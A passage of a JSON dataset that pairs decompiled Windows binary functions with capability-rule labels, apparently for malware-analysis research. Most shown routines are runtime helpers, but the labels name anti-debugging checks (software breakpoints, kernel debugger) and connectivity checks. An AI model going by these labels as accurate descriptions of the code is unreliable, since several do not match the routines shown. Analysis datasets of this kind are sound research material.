        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040bfcf(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00407b62();\n    var_4h = 0;\n    if (*0x5c3360 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x401a20);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x401a14);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x5c3360 = fcn.00407af0(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x401a04);\n        *0x5c3364 = fcn.00407af0(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x4019f0);\n        *0x5c3368 = fcn.00407af0(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x4019d4);\n        *0x5c3370 = fcn.00407af0(uVar3);\n        if (*0x5c3370 != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x4019bc);\n            *0x5c336c = fcn.00407af0(uVar3);\n        }\n    }\n    if ((*0x5c336c != iVar1) && (*0x5c3370 != iVar1)) {\n        pcVar4 = fcn.00407b6b(*0x5c336c);\n        pcVar5 = fcn.00407b6b(*0x5c3370);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x0040c111;\n        }\n    }\n    if ((((*0x5c3364 != iVar1) && (pcVar4 = fcn.00407b6b(*0x5c3364),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x5c3368 != iVar1 && (pcVar4 = fcn.00407b6b(*0x5c3368),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x0040c111:\n    pcVar4 = fcn.00407b6b(*0x5c3360);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 853
    },
    "0040d2de": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d2de(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040d7df;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040d413;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040d41a;\ncode_r0x0040d413:\n                        do {\n                            var_4h = 1;\ncode_r0x0040d41a:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040d428;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040d428:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x412ddc - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x412ddc < iVar12) {\n                if (iVar12 < *0x412dd8) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x412dd8;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040d7df;\n            }\n            var_10h = *0x412ddc - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040d5cb;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040d5cb:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040d7df:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3672
    },
    "0040d822": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d822(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040dd23;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x412df8 - 1;\n        iVar4 = *0x412df8 + (*0x412df8 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x412df8 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040d957;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040d95e;\ncode_r0x0040d957:\n                        do {\n                            var_4h = 1;\ncode_r0x0040d95e:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040d96c;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040d96c:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x412df4 - *0x412df8) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x412df4 < iVar12) {\n                if (iVar12 < *0x412df0) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x412e04;\n                    iVar4 = *0x412dfc + (*0x412dfc >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x412dfc & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x412dfc + (*0x412dfc >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x412dfc & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x412e04 + *0x412df0;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040dd23;\n            }\n            var_10h = *0x412df4 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x412df8 - 1;\n            iVar12 = *0x412df8 + (*0x412df8 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x412df8 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040db0f;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040db0f:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x412dfc + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040dd23:\n    var_20h = iVar12 << (0x1fU - *0x412dfc & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x412e00 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x412e00 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3644
    },
    "0040f92e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040f92e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x412cac ^ &stack0xfffffffc;\n    fcn.0040495d(arg_10h);\n    var_14h = fcn.004099c9(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040d2de(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040f987:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040f9c7;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040f9b9:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040f9c7;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040f9b9;\n        goto code_r0x0040f987;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040f9c7:\n    fcn.00405322(unaff_EBX);\n    return;\n}\n",
        "token_count": 513
    },
    "0040f9d6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040f9d6(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x412cac ^ &stack0xfffffffc;\n    fcn.0040495d(arg_10h);\n    var_14h = fcn.004099c9(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040d822(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040fa2f:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040fa6f;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040fa61:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040fa6f;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040fa61;\n        goto code_r0x0040fa2f;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040fa6f:\n    fcn.00405322(unaff_EBX);\n    return;\n}\n",
        "token_count": 508
    },
    "004046d7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004046d7(uint32_t arg_8h)\n\n{\n    fcn.004046b4();\n    if ((arg_8h & 1) != 0) {\n        fcn.00404b9e();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "00404d86": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d86(uint32_t arg_8h)\n\n{\n    fcn.00404d76();\n    if ((arg_8h & 1) != 0) {\n        fcn.00404b9e();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "004093da": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004093da(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00405f24(0x411188, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00405857();\n        *puVar2 = 0;\n        puVar2 = fcn.00405844();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x5c4784)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x5c47a0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0040d136(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = 